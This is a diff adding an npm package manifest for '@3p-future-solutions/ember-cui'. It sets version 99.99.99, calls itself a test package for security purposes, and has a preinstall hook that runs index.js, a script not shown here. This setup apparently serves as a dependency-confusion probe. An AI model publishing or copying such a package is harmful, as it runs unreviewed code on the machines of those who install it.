@@ -1,0 +1,12 @@
+{
+  "name": "@3p-future-solutions/ember-cui",
+  "version": "99.99.99",
+  "description": "test package for security purposes",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "node index.js",
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "author": "test",
+  "license": "ISC"
+}
